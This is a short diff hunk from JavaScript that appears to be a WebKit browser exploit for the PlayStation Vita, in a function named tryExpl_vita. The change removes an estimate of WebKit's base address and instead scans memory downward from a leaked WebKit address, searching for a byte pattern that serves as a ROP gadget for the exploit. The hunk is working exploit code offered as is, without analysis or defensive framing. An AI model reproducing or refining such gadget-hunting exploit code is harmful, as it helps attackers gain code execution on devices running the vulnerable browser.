@@ -190,16 +190,13 @@ function tryExpl_vita(att)
             }
         }
         
-        // approximate the top
-        var webkit_top = webkit - getU32(webkit+0x24);
-        
         var gadget1 = 0;
         var gadget2 = 0;
         var gadget3 = 0;
         
-        alert("Found webkit at:" + webkit_top.toString(16));
+        alert("Press OK, the process may take a few minutes. Found webkit at:" + webkit.toString(16));
         
-        for (var i = webkit_top; i < webkit; i+=2)
+        for (var i = webkit; ; i-=2)
         {
             // check for gadget 1
             // 09 68 19 B1 0A 68 92 68 90 47
